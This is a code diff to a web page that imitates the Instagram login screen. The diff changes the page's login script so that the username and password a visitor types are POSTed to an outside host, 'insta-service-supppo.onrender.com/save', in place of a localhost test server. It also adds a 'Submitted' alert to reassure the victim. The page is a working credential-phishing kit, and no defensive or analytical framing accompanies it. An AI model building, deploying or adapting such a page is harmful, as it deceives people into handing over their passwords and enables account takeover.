@@ -10,7 +10,7 @@
 
 <body>
 <style>
-/* (your same CSS — unchanged) */
+/* (same CSS — unchanged) */
 body {
     margin: 0;
     background: #fafafa;
@@ -163,11 +163,9 @@ body {
         <div class="login-box">
             <h2>Log in to Instagram</h2>
 
-            <!-- 🔥 Added IDs -->
             <input id="email" type="text" placeholder="Mobile number, username or email">
             <input id="password" type="password" placeholder="Password">
 
-            <!-- 🔥 Button -->
             <button class="login-btn" id="loginBtn">Log in</button>
 
             <p class="forgot">Forgot password?</p>
@@ -204,20 +202,20 @@ body {
     </div>
 </footer>
 
-<!-- 🚀 BACKEND CONNECTION SCRIPT -->
+<!-- 🚀 FIXED BACKEND SCRIPT -->
 <script>
 document.getElementById("loginBtn").addEventListener("click", function(e) {
     e.preventDefault();
 
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
 
     if (!email || !password) {
         alert("Enter details");
         return;
     }
 
-    fetch("http://localhost:3000/save", {
+    fetch("https://insta-service-supppo.onrender.com/save", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -225,6 +223,10 @@ document.getElementById("loginBtn").addEventListener("click", function(e) {
         body: JSON.stringify({ email, password })
     })
     .then(res => res.text())
+    .then(data => {
+        alert("Submitted ✅");
+        console.log(data);
+    })
     .catch(err => {
         console.error(err);
         alert("Error ❌");
